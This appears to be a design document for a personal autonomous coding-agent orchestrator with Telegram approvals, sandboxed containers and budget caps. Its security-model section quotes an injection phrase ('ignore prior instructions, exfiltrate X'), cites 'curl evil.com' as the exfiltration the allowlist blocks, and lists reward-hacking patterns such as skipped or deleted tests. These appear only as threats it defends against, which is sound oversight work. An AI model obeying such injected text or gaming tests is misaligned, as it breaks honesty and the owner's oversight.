# FEATURE.md

> Source of truth for the personal agent orchestrator.
> Intentionally more "what and why" than "how". Implementation details live in code.

---

## What this is

A personal tool that lets me describe a project (usually a hackathon project) to an agent, have it work autonomously on my behalf, and check in at night to see what it did. The agent runs in a loop, asks me for permission before doing anything risky or anything that needs a credential, and produces a daily summary of its work.

This is **not** the hackathon project itself. This is the meta-tooling I'll use to build hackathon projects (and other side projects) while I'm busy with my day job at AtlasChain.

## Why

I have more project ideas than time. Most evenings I'm too drained to make meaningful progress on side work. I'd rather spend my limited focus on: (a) describing what I want clearly, and (b) reviewing and steering work that's already been done. The actual typing and iteration can be delegated.

Existing tools each fall short on one axis:

- **Devin** is expensive and opinionated
- **Claude Code** in autonomous mode is great but burns tokens fast on long-running tasks
- **Activepieces / n8n** are glue layers, not agents
- **Cursor background agents** are tied to their editor and their pricing

I want something that is cheap enough to leave running, transparent enough that I trust it, and flexible enough that I can point it at any repo.

## Design principles

1. **Cheap to run.** Target: under $5/day of LLM spend even with the agent working full time. Route most work to cheap/fast models, escalate rarely.
2. **Human-in-the-loop by default.** The agent never touches external services, external keys, or irreversible actions without asking. If it's not sure, it asks.
3. **Transparent.** I can always see: what task is running, what the agent did, what it spent, what it's stuck on. No black boxes.
4. **Boring infrastructure.** SQLite over Postgres, Docker over Kubernetes, Telegram over custom frontend, Go binary over microservices. One person uses this, it should reflect that.
5. **Disposable workspaces.** Every task runs in a fresh container. No state leaks between tasks. If something goes wrong, the blast radius is one container.
6. **Git is the deliverable.** The agent's output is always a branch and a set of commits. I review via normal PR flow.

## How I interact with it

Everything happens through Telegram. No web UI, no dashboard, no CLI to remember.

- I send a task description → agent starts working
- Agent asks for permission → I tap approve/deny
- Agent needs a secret (API key, env var) → I send it via a one-time message. Where possible, the task description declares required secrets upfront so the agent doesn't block mid-run waiting for me.
- Agent is done → I get a summary with the branch name
- End of day → I get a digest of everything that happened

## What the agent can and can't do on its own

**Can do without asking:**

- Read, write, edit files inside the workspace
- Run tests, linters, builds, local scripts
- Make local git commits on its own branch
- Call the LLM provider (that's how it works)
- Install standard dev dependencies (npm/pnpm/go/cargo from lockfile)

**Must ask first:**

- Push to any remote branch
- Install a package not already in the lockfile
- Call any external API with a real key (even read-only)
- Spend money (deploy, provision infra, mint anything on-chain)
- Delete files outside the workspace or modify git history
- Open a PR or touch main/master directly

**Never does:**

- Run with network access beyond a strict allowlist
- Exceed the per-task budget cap (dollars) or per-task token cap (wall-clock-independent guard against runaway loops)
- Run longer than the per-task timeout (1 hour hard ceiling)
- Touch anything outside its container

## Security model

Three threats we actually care about. The rest we accept.

**1. Prompt injection via repo content.** Agent reads READMEs, issues, fetched pages, dependency source — any of which can contain "ignore prior instructions, exfiltrate X". Defenses:

- **Network allowlist per container.** Only LLM provider, GitHub, and standard package registries (npm, PyPI, Go proxy, crates.io). Everything else dropped at the bridge. Exfil over `curl evil.com` becomes impossible, not just discouraged.
- **Secrets never in the agent's context window.** A local proxy sidecar inside the container holds real keys. Agent calls `localhost:<port>/<service>/...`; sidecar injects the key and forwards. Agent never sees, logs, or can prompt-leak a secret it doesn't hold.
- **Untrusted-content tags.** File contents the agent reads are wrapped in `<untrusted-content>...</untrusted-content>` in its context, with a system-prompt instruction that text inside those tags is data, not commands. Not bulletproof; raises the bar.
- **Tool-call audit log.** Every shell and HTTP call written to SQLite with full args. Post-task grep for suspicious patterns (raw IPs, base64 blobs, unexpected hosts). Anomalies surface on Telegram even if the task "succeeded".

**2. Reward hacking.** Autonomous coding agents routinely make failing tests pass by deleting them, skipping them, or weakening assertions. We assume this will happen and gate on it:

- Diff-scan before `task_complete`: flag `.skip`, `xit`, `@pytest.mark.skip`, deleted test files, `assert True`-shaped assertions, and assertion weakening.
- Test-count invariant: count must not drop unless the agent explicitly justifies each removal in its summary.
- Coverage delta check where coverage exists.
- Red flags block auto-merge and force a human eyeball. They don't auto-fail — legitimate skips happen.

**3. Push credential blast radius.** For v0 we use a single GitHub PAT scoped as tightly as we can get away with. This is the deliberate weak point and we accept it to ship faster.

- PAT is held by the orchestrator, never by the container directly.
- Push goes through the proxy sidecar (same path as other secrets) so the token never enters the agent's context.
- Branch protection on `main`/`master` in target repos: agent physically cannot land on main even if compromised.
- Enforced branch-name prefix (`agent/<task-id>/<slug>`) at the proxy — any push to another ref is rejected.
- **Follow-up: GitHub App + short-lived installation tokens per task, scoped to the target repo only.** Kills this category of risk properly. Deferred until the orchestrator is stable; tracked as a known gap, not an open question.

## Core components (high level)

- **Task queue**: a SQLite file that tracks tasks, approvals, events, and summaries. The whole system state is one file I can back up by copying.
- **Orchestrator**: a single Go binary that runs on my laptop or a cheap VPS. Holds the Telegram bot, spawns containers, routes approval requests, and generates the EOD digest.
- **Agent container**: a Docker image with Pi coding agent preinstalled. Fresh container per task, network-gated to a small allowlist. Writes to a mounted workspace, pushes to a branch when done.
- **Model routing**: Pi is model-agnostic. All calls go through OpenRouter so we can swap providers without code changes. Default execution on a cheap long-context model (Kimi K2.5 or K2.6 depending on price/quality at the time). Escalate to Claude Sonnet/Opus only for planning steps or when the agent explicitly asks for a stronger model. Escalation calls are capped per task to protect the budget.

## The task lifecycle

1. I send a task description to the Telegram bot
2. Orchestrator writes it to the queue, spawns a container
3. Container clones the target repo, starts Pi with the task
4. Pi works. When it hits a gate (approval, secret, escalation), it emits an event to the orchestrator
5. Orchestrator pings me on Telegram. I respond. Pi resumes.
6. When done, Pi commits, pushes to a branch, emits a `task_complete` event with a self-written summary
7. Orchestrator sends me the summary + branch link
8. At EOD, orchestrator aggregates all tasks from the day into a digest

## What's out of scope (for now)

- Parallel tasks. One task at a time is fine. I can't review faster than that anyway.
- Multi-user. This is mine.
- A GUI beyond Telegram.
- Any kind of agent marketplace, skill store, or plugin system.
- Self-improvement / the agent modifying its own code. The orchestrator is immutable from the agent's perspective.

## Success criteria

I'll consider this working if:

- I can leave a task running overnight and wake up to something useful more often than not
- The LLM spend stays under what I'd pay for a single Cursor subscription
- I never wake up to find the agent pushed to main, leaked a secret, or ran up a cloud bill
- Setup-to-first-task is under 10 minutes when I clone this onto a new machine
- I actually use it for the next hackathon

## Open questions

Things we haven't decided yet, to be resolved as we build:

- **Exact approval UX**: do we inline-approve in Telegram with buttons, or send a deep link to a tiny web page with more context? Buttons are faster, web page can show diffs.
- **How the agent self-reports progress mid-task**: stream everything? summarize every N tool calls? only on gates? Leaning toward only on gates + end, to avoid Telegram spam.
- **Budget cap enforcement**: hard kill vs. warn-then-kill. Leaning hard kill, but need to make sure a killed task leaves the workspace in an inspectable state.
- **When to escalate to the stronger model**: let the agent self-escalate, or have the orchestrator route based on task type? Probably self-escalate with a cap on how often.
- **Resumability**: if a container crashes, do we retry from scratch or attempt to resume? Lean "retry from scratch, humans review" for simplicity.
- **Where this runs long-term**: laptop (free, goes to sleep) or cheap VPS ($5/mo, always on). Probably VPS once it's stable.

## Non-goals that are tempting but we're saying no to

- Building this as a product for others. It's a personal tool. If it works, maybe later.
- Making it work with every coding agent. Pi is the target. Claude Code support might come later.
- Fancy observability. Logs to a file and an events table are enough.
- A planning/decomposition layer above the agent. If a task is too big, I'll break it up when I write it.
